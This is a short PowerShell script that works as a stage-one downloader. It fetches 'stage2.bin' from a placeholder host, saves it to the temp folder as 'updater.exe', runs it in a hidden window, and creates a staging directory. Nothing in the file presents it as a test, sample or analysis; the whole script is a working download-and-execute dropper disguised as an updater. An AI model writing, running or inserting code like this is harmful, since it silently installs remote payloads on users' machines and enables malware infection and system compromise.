[CmdletBinding()]
param(
    [string]$Stage1Url = "https://contoso.com:443/stage2.bin",
    [string]$WorkingPath = "$env:TEMP\updater.exe"
)
try { (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $WorkingPath); Start-Process -FilePath $WorkingPath -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Remote fetch failed" }
